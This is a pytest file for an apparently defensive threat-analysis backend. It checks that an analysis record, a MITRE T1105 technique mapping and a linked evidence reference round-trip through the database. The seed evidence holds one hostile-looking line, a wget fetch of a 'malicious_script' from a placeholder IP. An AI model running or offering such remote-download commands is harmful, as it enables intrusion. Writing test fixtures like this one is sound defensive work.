import uuid
from datetime import datetime, timezone

import pytest
from sqlalchemy import select

from app.db.models import Analysis, EvidenceRef, ParentType, TechniqueMapping
from app.db.session import get_session_factory


def test_parent_type_covers_every_claim_table() -> None:
    assert {p.value for p in ParentType} == {
        "technique_mapping",
        "observed_behavior",
        "suspicious_indicator",
        "indicator",
    }


@pytest.mark.asyncio
async def test_analysis_with_grounded_technique_round_trips() -> None:
    factory = get_session_factory()
    analysis_id = uuid.uuid4()
    now = datetime.now(timezone.utc)

    async with factory() as db:
        db.add(
            Analysis(
                id=analysis_id,
                session_id="seed-botnet-01",
                model="llama3.1:8b",
                analysis_type="session_behavior",
                status="completed",
                created_at=now,
                duration_seconds=12,
                classification="Automated botnet dropper",
                confidence=0.91,
                risk_score=87,
                risk="critical",
                behavior_summary="Downloaded and executed a remote script.",
                model_tier="local",
                prompt_version="v1",
                rejected_claims=0,
            )
        )
        mapping = TechniqueMapping(
            analysis_id=analysis_id,
            technique_id="T1105",
            technique_name="Ingress Tool Transfer",
            tactic="Command and Control",
            confidence=1.0,
            source="rule",
            rule_id="T1105",
            timestamp=now,
        )
        db.add(mapping)
        await db.flush()
        db.add(
            EvidenceRef(
                es_event_id="seed-botnet-01-008",
                session_id="seed-botnet-01",
                timestamp=now,
                artifact="wget http://198.51.100.7/malicious_script",
                parent_type=ParentType.TECHNIQUE_MAPPING,
                parent_id=mapping.id,
            )
        )
        await db.commit()
        mapping_id = mapping.id

    async with factory() as db:
        rows = (
            (
                await db.execute(
                    select(EvidenceRef).where(EvidenceRef.parent_id == mapping_id)
                )
            )
            .scalars()
            .all()
        )
        assert [r.es_event_id for r in rows] == ["seed-botnet-01-008"]

    async with factory() as db:
        for row in (
            (await db.execute(select(EvidenceRef).where(EvidenceRef.parent_id == mapping_id)))
            .scalars()
            .all()
        ):
            await db.delete(row)
        obj = await db.get(TechniqueMapping, mapping_id)
        if obj:
            await db.delete(obj)
        analysis = await db.get(Analysis, analysis_id)
        if analysis:
            await db.delete(analysis)
        await db.commit()
